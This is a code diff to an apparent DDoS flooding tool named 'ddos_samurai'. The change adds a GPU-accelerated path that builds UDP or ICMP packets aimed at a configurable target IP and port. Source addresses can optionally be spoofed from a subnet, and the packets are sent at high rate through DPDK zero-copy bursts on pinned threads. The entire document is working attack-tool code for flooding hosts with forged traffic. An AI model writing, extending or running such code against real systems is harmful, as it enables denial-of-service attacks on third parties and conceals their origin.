@@ -18,6 +18,8 @@
 
 #include <pthread.h>
 #include <sched.h>
+#include <dlfcn.h>
+#include <memory>
 
 #include <zmq.h>
 
@@ -54,6 +56,106 @@ using ddos_samurai::cpu_native::SpoofOptions;
 
 constexpr const char* kDefaultJobs = "ipc:///tmp/samurai_jobs_dpdk";
 constexpr const char* kDefaultEvents = "ipc:///tmp/samurai_events_dpdk";
+constexpr const char* kDefaultGpuLib = "ddos_samurai/libgpu_packet_cuda.so";
+constexpr std::uint64_t kDefaultGatewayMac = 0xFFFFFFFFFFFFull;
+
+using fn_gpu_gen_packets_t = int (*)(std::int64_t, const char*, std::int64_t, const char*, int, const char*,
+                                     std::int64_t, int, std::int64_t, std::uint64_t, std::uint64_t, const char*,
+                                     std::uint8_t**, std::size_t*, int*);
+using fn_gpu_gen_icmp_t = int (*)(std::int64_t, const char*, const char*, int, int, std::int64_t, std::int64_t,
+                                  std::int64_t, std::uint64_t, std::uint64_t, const char*, std::uint8_t**,
+                                  std::size_t*, int*);
+using fn_gpu_p2p_arena_info_t = int (*)(std::uint64_t*, void**, void**, std::size_t*);
+using fn_gpu_free_t = void (*)(void*);
+
+struct DpdkGpuP2pPool {
+  void* dl_handle{nullptr};
+  fn_gpu_free_t free_fn{nullptr};
+  std::uint8_t* data_ptr{nullptr};
+  std::size_t byte_len{0};
+  std::uint16_t packet_size{0};
+  std::uint64_t bar1_iova{0};
+  bool active{false};
+
+  ~DpdkGpuP2pPool() {
+    if (data_ptr && free_fn) {
+      free_fn(data_ptr);
+      data_ptr = nullptr;
+    }
+    if (dl_handle) {
+      dlclose(dl_handle);
+      dl_handle = nullptr;
+    }
+  }
+};
+
+inline bool TryGenerateGpuBar1Pool(
+    const samurai::wire::JobEnvelopeV1& env,
+    int packet_count,
+    DpdkGpuP2pPool& out) {
+  setenv("SAMURAI_GPU_PACKET_BAR1_P2P_OUTPUT", "1", 1);
+  const char* lib_env = std::getenv("SAMURAI_GPU_NATIVE_LIB");
+  const char* lib_path = (lib_env && *lib_env) ? lib_env : kDefaultGpuLib;
+  out.dl_handle = dlopen(lib_path, RTLD_NOW | RTLD_LOCAL);
+  if (!out.dl_handle) {
+    return false;
+  }
+  auto gen_pkts = reinterpret_cast<fn_gpu_gen_packets_t>(
+      dlsym(out.dl_handle, "samurai_gpu_packet_generate_packets"));
+  auto gen_icmp = reinterpret_cast<fn_gpu_gen_icmp_t>(
+      dlsym(out.dl_handle, "samurai_gpu_packet_generate_icmp_packets"));
+  auto arena_info = reinterpret_cast<fn_gpu_p2p_arena_info_t>(
+      dlsym(out.dl_handle, "samurai_gpu_packet_p2p_get_arena_info"));
+  out.free_fn = reinterpret_cast<fn_gpu_free_t>(
+      dlsym(out.dl_handle, "samurai_gpu_packet_free"));
+  if (!gen_pkts || !gen_icmp || !out.free_fn) {
+    return false;
+  }
+
+  const std::string protocol = ReadFixed(env.protocol, sizeof(env.protocol));
+  const std::string spoof_subnet = ReadFixed(env.spoof_subnet, sizeof(env.spoof_subnet));
+  const char* spoof_subnet_ptr = spoof_subnet.empty() ? "1.0.0.0/8" : spoof_subnet.c_str();
+  const std::string target_ip = ReadFixed(env.target_ip, sizeof(env.target_ip));
+  const std::string target_ip_norm = target_ip.empty() ? "127.0.0.1" : target_ip;
+  const int pool_packets = std::min(std::max(1, packet_count), 65536);
+
+  std::uint8_t* ptr = nullptr;
+  std::size_t out_size = 0;
+  int out_pkt_size = 0;
+  int rc = -1;
+  if (protocol == "icmp" || protocol == "ICMP") {
+    rc = gen_icmp(
+        pool_packets, target_ip_norm.c_str(), "192.168.1.100",
+        env.spoof_enabled != 0u ? 1 : 0, 1, 8, 0,
+        std::max<std::int64_t>(0, static_cast<std::int64_t>(env.packet_size) - 42),
+        0ull, kDefaultGatewayMac, spoof_subnet_ptr, &ptr, &out_size, &out_pkt_size);
+  } else {
+    const std::string proto = protocol.empty() ? "udp" : protocol;
+    rc = gen_pkts(
+        pool_packets, target_ip_norm.c_str(), static_cast<std::int64_t>(env.target_port),
+        proto.c_str(), env.spoof_enabled != 0u ? 1 : 0, "192.168.1.100",
+        2, 1, env.window == 0ull ? -1 : static_cast<std::int64_t>(env.window),
+        0ull, kDefaultGatewayMac, spoof_subnet_ptr, &ptr, &out_size, &out_pkt_size);
+  }
+  if (rc != 0 || !ptr || out_pkt_size <= 0 || out_size < static_cast<std::size_t>(out_pkt_size)) {
+    return false;
+  }
+  out.data_ptr = ptr;
+  out.byte_len = out_size;
+  out.packet_size = static_cast<std::uint16_t>(out_pkt_size);
+  if (arena_info) {
+    void* host_bar1 = nullptr;
+    void* cuda_dev = nullptr;
+    std::uint64_t phys_base = 0;
+    std::size_t arena_bytes = 0;
+    if (arena_info(&phys_base, &host_bar1, &cuda_dev, &arena_bytes) == 0 &&
+        static_cast<std::uint8_t*>(host_bar1) == ptr) {
+      out.bar1_iova = phys_base;
+    }
+  }
+  out.active = true;
+  return true;
+}
 
 
 
@@ -190,6 +292,7 @@ struct alignas(64) TxWorkerThread {
 // durumuna sahiptir; kuyruklar thread'e özel olduğundan kilit gerekmez.
 void tx_thread_func(TxWorkerThread* tw, std::int64_t handle,
                     const std::uint8_t* pool_data, std::size_t pool_len,
+                    std::uint64_t bar1_p2p_iova,
                     std::uint16_t stride, int start, int end,
                     samurai_pacing_config_t pace_cfg) {
   if (tw->cpu_core >= 0) {
@@ -211,7 +314,8 @@ void tx_thread_func(TxWorkerThread* tw, std::int64_t handle,
     std::uint16_t batch = static_cast<std::uint16_t>(
         std::min<int>(end - i, static_cast<int>(kTxBurstMax)));
 
-    const std::size_t off = static_cast<std::size_t>(i) * stride;
+    const std::size_t off = (static_cast<std::size_t>(i) * stride) %
+                            std::max<std::size_t>(stride, (pool_len / stride) * stride);
     if (off + static_cast<std::size_t>(batch) * stride > pool_len) {
       const std::size_t avail = pool_len > off ? (pool_len - off) / stride : 0;
       batch = static_cast<std::uint16_t>(std::min<std::size_t>(batch, avail));
@@ -220,8 +324,12 @@ void tx_thread_func(TxWorkerThread* tw, std::int64_t handle,
       break;
     }
 
-    const samurai::dpdk::TxResult r = samurai::dpdk::tx_burst(
-        handle, tw->queue_id, pool_data + off, stride, batch);
+    const samurai::dpdk::TxResult r = (bar1_p2p_iova != 0u)
+        ? samurai::dpdk::tx_burst_extbuf_zero_copy(
+              handle, tw->queue_id, const_cast<std::uint8_t*>(pool_data), bar1_p2p_iova,
+              pool_len, off, stride, batch)
+        : samurai::dpdk::tx_burst(
+              handle, tw->queue_id, pool_data + off, stride, batch);
     tw->packets_sent.fetch_add(r.sent, std::memory_order_relaxed);
     tw->packets_errors.fetch_add(r.errors, std::memory_order_relaxed);
     tw->bytes_sent.fetch_add(r.sent * static_cast<std::uint64_t>(stride),
@@ -267,6 +375,8 @@ int main(int argc, char** argv) {
       cli_tx_queues = std::stoi(argv[++i]);
     } else if (arg == "--dpdk-eal-args" && i + 1 < argc) {
       cli_eal_args = argv[++i];
+    } else if (arg == "--gpu-p2p") {
+      setenv("SAMURAI_DPDK_GPU_P2P", "1", 1);
     }
   }
 
@@ -381,9 +491,18 @@ int main(int argc, char** argv) {
       try {
         PacketConfig cfg = ConfigFromEnvelope(env);
         const int packet_count = std::max(1, static_cast<int>(env.packet_count));
-        const auto pool = ddos_samurai::cpu_native::generate_packet_pool_view(cfg, packet_count, true, true);
-        const std::size_t stride = pool.packet_size;
-        if (stride == 0 || pool.size() < stride) {
+        const char* gpu_p2p_env = std::getenv("SAMURAI_DPDK_GPU_P2P");
+        const bool want_gpu_p2p = (gpu_p2p_env && std::atoi(gpu_p2p_env) != 0);
+        DpdkGpuP2pPool gpu_p2p_pool{};
+        const bool using_gpu_p2p = want_gpu_p2p && TryGenerateGpuBar1Pool(env, packet_count, gpu_p2p_pool);
+        ddos_samurai::cpu_native::PacketPoolView cpu_pool{};
+        if (!using_gpu_p2p) {
+          cpu_pool = ddos_samurai::cpu_native::generate_packet_pool_view(cfg, packet_count, true, true);
+        }
+        const std::uint8_t* active_pool_data = using_gpu_p2p ? gpu_p2p_pool.data_ptr : cpu_pool.data();
+        const std::size_t active_pool_size = using_gpu_p2p ? gpu_p2p_pool.byte_len : cpu_pool.size();
+        const std::size_t stride = using_gpu_p2p ? gpu_p2p_pool.packet_size : cpu_pool.packet_size;
+        if (stride == 0 || active_pool_size < stride || !active_pool_data) {
           (void)SendFrame(push, static_cast<std::uint8_t>(samurai::wire::MessageType::ERROR), header.correlation_id,
                           samurai::wire::WorkerKind::DPDK, job_id, JsonError("packet_pool_empty"));
           continue;
@@ -446,6 +565,16 @@ int main(int argc, char** argv) {
           continue;
         }
 
+        std::uint64_t active_bar1_iova = 0u;
+        if (using_gpu_p2p && gpu_p2p_pool.bar1_iova != 0u) {
+          std::string extmem_err;
+          if (samurai::dpdk::register_extmem_region(
+                  dpdk.handle, gpu_p2p_pool.data_ptr, gpu_p2p_pool.byte_len,
+                  gpu_p2p_pool.bar1_iova, 4096u, extmem_err)) {
+            active_bar1_iova = gpu_p2p_pool.bar1_iova;
+          }
+        }
+
         // NUMA pinning guard (O1): CPU çekirdek tabanı env ile verilebilir.
         const int base_core = std::getenv("SAMURAI_DPDK_BASE_CORE")
             ? std::atoi(std::getenv("SAMURAI_DPDK_BASE_CORE")) : -1;
@@ -485,8 +614,8 @@ int main(int argc, char** argv) {
           const int seg_start = cursor;
           const int seg_end = cursor + cnt;
           cursor = seg_end;
-          tw.th = std::thread(tx_thread_func, &tw, dpdk.handle, pool.data(), pool.size(),
-                              static_cast<std::uint16_t>(stride), seg_start, seg_end, thread_pace);
+          tw.th = std::thread(tx_thread_func, &tw, dpdk.handle, active_pool_data, active_pool_size,
+                              active_bar1_iova, static_cast<std::uint16_t>(stride), seg_start, seg_end, thread_pace);
         }
 
         auto aggregate = [&workers](std::uint64_t& ps, std::uint64_t& pe,
